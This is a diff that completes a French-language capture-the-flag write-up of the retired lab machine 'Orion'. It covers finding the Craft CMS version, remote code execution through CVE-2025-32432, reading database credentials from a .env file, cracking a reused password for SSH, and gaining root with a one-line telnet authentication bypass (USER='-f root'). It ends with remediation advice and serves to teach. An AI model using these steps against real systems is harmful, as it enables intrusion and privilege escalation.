@@ -35,6 +35,7 @@
       <li class="tag blue">Linux</li>
       <li class="tag">Très facile</li>
       <li class="tag">CraftCMS</li>
+      <li class="tag">Machine retirée</li>
     </ul>
     <h1>Orion</h1>
     <p class="lede">Trois maillons, trois erreurs distinctes : un CMS non mis à jour, un mot de passe réutilisé, et un service d'accès distant obsolète laissé en écoute.</p>
@@ -57,22 +58,73 @@
     </ul>
 
     <h2>Reconnaissance</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Nmap ne montre que deux ports ouverts : 22 (SSH) et 80 (Nginx), qui redirige vers
+      <code>orion.htb</code> une fois le domaine ajouté localement.
+    </p>
 
     <h2>Identifier le CMS et sa version</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Le répertoire <code>/admin</code> révèle Craft CMS, et la page de connexion donne le numéro
+      de version exact.
+    </p>
+    <pre><code><span class="c"># Détection du CMS et de sa version exacte</span>
+curl -s http://orion.htb/admin/login | grep -i 'Craft CMS'
+<span class="out">→ Version exposée : Craft CMS 5.6.16</span></code></pre>
+    <p>
+      Cette version est concernée par CVE-2025-32432, une exécution de code arbitraire
+      exploitable sans authentification préalable.
+    </p>
 
     <h2>Exécution de code</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      La faille se situe dans le contrôleur de génération de transformations d'images
+      (<code>/index.php?p=actions/assets/generate-transform</code>). En combinant une injection
+      de code PHP dans le fichier de session et une désérialisation non sécurisée de classes,
+      l'application en vient à évaluer des commandes système arbitraires.
+    </p>
+    <pre><code><span class="c"># Requête ciblant le contrôleur d'assets Craft CMS</span>
+POST /index.php?p=actions/assets/generate-transform HTTP/1.1
+Host: orion.htb
+Content-Type: application/json
+
+<span class="c"># Résultat : session interactive sous l'identité www-data</span></code></pre>
 
     <h2>Passage utilisateur</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Le fichier <code>/html/craft/.env</code> contient les identifiants MySQL en clair
+      (<code>root:SuperSecureCraft123Pass!</code>). La table <code>users</code> livre un hash
+      bcrypt pour le compte <code>adam</code>, cassable avec la liste rockyou : le mot de passe
+      en clair est <code>darkangel</code>, réutilisable directement en SSH.
+    </p>
 
     <h2>Élévation de privilèges</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Un service Telnet (GNU inetutils 2.7) écoute en local sur le port 23. Il est concerné par
+      CVE-2026-24061 : en injectant l'argument <code>-f root</code> dans la variable
+      d'environnement <code>USER</code> transmise au binaire <code>login</code>, on contourne
+      purement et simplement l'authentification.
+    </p>
+    <pre><code><span class="c"># Vérification du binaire Telnet vulnérable</span>
+telnet --version
+<span class="out">→ telnet (GNU inetutils) 2.7</span>
+
+<span class="c"># Commande d'élévation immédiate vers le compte root</span>
+USER="-f root" telnet -a 127.0.0.1
+<span class="out">Trying 127.0.0.1...
+Connected to 127.0.0.1.
+root@orion:~# id
+→ uid=0(root) gid=0(root) groups=0(root)</span></code></pre>
 
     <h2>Ce que j'en retiens</h2>
-    <p class="draft">En cours de rédaction</p>
+    <p>
+      Trois maillons, trois familles de problèmes différentes : un CMS non mis à jour exposé sans
+      authentification, un mot de passe de dictionnaire réutilisé entre deux services, et un
+      démon historique laissé actif en local alors qu'il n'a plus sa place. Les correctifs sont à
+      la hauteur : mettre à jour Craft CMS au-delà de la 5.6.16, désactiver purement et simplement
+      Telnet (ou appliquer le correctif pour CVE-2026-24061 sur inetutils), et imposer une
+      politique de mots de passe qui exclut les termes de dictionnaire comme <code>darkangel</code>.
+    </p>
 
   </main>
 </div>
